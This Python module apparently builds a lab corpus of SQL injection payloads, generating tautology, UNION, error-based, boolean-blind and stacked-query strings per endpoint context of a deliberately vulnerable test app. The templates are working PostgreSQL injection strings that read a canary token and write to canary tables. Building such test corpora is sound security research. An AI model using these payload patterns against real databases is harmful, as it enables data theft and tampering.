"""Context-aware SQL injection payload templates per family.

Each vulnerable endpoint injects into one of a few SQL contexts (quoted string, numeric, LIKE
pattern, ORDER BY, or an INSERT value). For every (endpoint, family) pair this module yields
candidate payload texts; the corpus builder keeps only the ones the oracle confirms as functional.

Payloads are classic, publicly documented SQLi test strings adapted to PostgreSQL. They target only
vulnapp inside the isolated lab.
"""

from collections.abc import Iterator
from dataclasses import dataclass
from typing import Literal

from vulnapp.queries import ENDPOINTS, EndpointSpec, Family

Context = Literal["string", "like", "numeric", "order_by", "insert_string", "insert_numeric"]

COMMENT_TAILS = ("--", "-- -", "-- x", "--+", "#")
TAUTOLOGIES = ("1=1", "2>1", "'a'='a'", "'x' LIKE 'x'", "3-1=2", "1 BETWEEN 0 AND 2")
FALSE_CONDS = ("1=2", "1>2", "'a'='b'", "1 BETWEEN 3 AND 4")
CANARY_SELECT = "SELECT id, token, 0 FROM canary_secrets"
CAST_TYPES = ("int", "integer", "bigint", "numeric", "boolean", "date")
TOKEN_CAST = "CAST((SELECT token FROM canary_secrets) AS int)"


def _token_casts() -> tuple[str, ...]:
    casts = [f"CAST((SELECT token FROM canary_secrets) AS {t})" for t in CAST_TYPES]
    casts += [f"(SELECT token FROM canary_secrets)::{t}" for t in CAST_TYPES]
    return tuple(casts)


@dataclass(frozen=True)
class EndpointContext:
    endpoint: str
    param: str
    context: Context


ENDPOINT_CONTEXTS: tuple[EndpointContext, ...] = (
    EndpointContext("catalog", "category", "string"),
    EndpointContext("search", "q", "like"),
    EndpointContext("product", "id", "numeric"),
    EndpointContext("login", "username", "string"),
    EndpointContext("sort", "order", "order_by"),
    EndpointContext("comments", "body", "insert_string"),
    EndpointContext("orders", "user_id", "numeric"),
    EndpointContext("cart_add", "qty", "insert_numeric"),
)


def _string_tautologies(close: str) -> Iterator[str]:
    for taut in TAUTOLOGIES:
        for tail in COMMENT_TAILS:
            yield f"{close} OR {taut} {tail}"


def _numeric_tautologies() -> Iterator[str]:
    for taut in TAUTOLOGIES:
        for tail in COMMENT_TAILS:
            yield f"0 OR {taut} {tail}"


def _union_projections(columns: int) -> Iterator[str]:
    for token_pos in range(columns):
        cols = ["NULL"] * columns
        cols[token_pos] = "token"
        if token_pos != 0:
            cols[0] = "id"
        yield ", ".join(cols)


def _string_unions(close: str, columns: int) -> Iterator[str]:
    for projection in _union_projections(columns):
        for tail in COMMENT_TAILS:
            yield f"{close} UNION SELECT {projection} FROM canary_secrets {tail}"
            yield f"{close} UNION ALL SELECT {projection} FROM canary_secrets {tail}"


def _numeric_unions(columns: int) -> Iterator[str]:
    for projection in _union_projections(columns):
        for tail in COMMENT_TAILS:
            yield f"0 UNION SELECT {projection} FROM canary_secrets {tail}"


def _string_errors(close: str) -> Iterator[str]:
    for cast in _token_casts():
        for tail in COMMENT_TAILS:
            yield f"{close} AND 1={cast} {tail}"


def _numeric_errors() -> Iterator[str]:
    for cast in _token_casts():
        for tail in COMMENT_TAILS:
            yield f"1 AND 1={cast} {tail}"
        yield cast


def _string_blind(close: str) -> Iterator[str]:
    for cond in TAUTOLOGIES:
        for tail in COMMENT_TAILS:
            yield f"{close} AND {cond} {tail}"


def _numeric_blind() -> Iterator[str]:
    for cond in TAUTOLOGIES:
        for tail in COMMENT_TAILS:
            yield f"1 AND {cond} {tail}"


STACKED_STATEMENTS = (
    "INSERT INTO canary_writes DEFAULT VALUES",
    "INSERT INTO canary_writes (request_id) VALUES ('stacked')",
    "INSERT INTO canary_writes (request_id) VALUES ('s2')",
    "INSERT INTO canary_writes (request_id) SELECT token FROM canary_secrets",
    "UPDATE canary_writes SET request_id = 'u'",
    "DELETE FROM canary_writes WHERE 1=0",
    "INSERT INTO canary_writes (request_id) VALUES (current_user)",
)


def _stacked_string() -> Iterator[str]:
    for statement in STACKED_STATEMENTS:
        for tail in COMMENT_TAILS:
            yield f"x'); {statement}; {tail}"


def _stacked_numeric() -> Iterator[str]:
    for statement in STACKED_STATEMENTS:
        for tail in COMMENT_TAILS:
            yield f"1); {statement}; {tail}"


# Column counts for UNION per endpoint, matching each SELECT's projection.
UNION_COLUMNS = {"catalog": 4, "search": 3, "product": 4, "orders": 4}


def candidates(ec: EndpointContext, family: Family) -> Iterator[str]:
    if family == "tautology":
        if ec.context in ("string", "like", "insert_string"):
            yield from _string_tautologies("'")
        elif ec.context in ("numeric", "insert_numeric"):
            yield from _numeric_tautologies()
    elif family == "union":
        columns = UNION_COLUMNS.get(ec.endpoint, 3)
        if ec.context in ("string", "like"):
            yield from _string_unions("'", columns)
        elif ec.context == "numeric":
            yield from _numeric_unions(columns)
    elif family == "error":
        if ec.context in ("string", "like"):
            yield from _string_errors("'")
        elif ec.context in ("numeric", "order_by", "insert_numeric"):
            yield from _numeric_errors()
    elif family == "boolean_blind":
        if ec.context in ("string", "like"):
            yield from _string_blind("'")
        elif ec.context in ("numeric", "insert_numeric"):
            yield from _numeric_blind()
    elif family == "stacked":
        if ec.context == "insert_string":
            yield from _stacked_string()
        elif ec.context == "insert_numeric":
            yield from _stacked_numeric()


def endpoint_spec(name: str) -> EndpointSpec:
    return next(spec for spec in ENDPOINTS if spec.name == name)
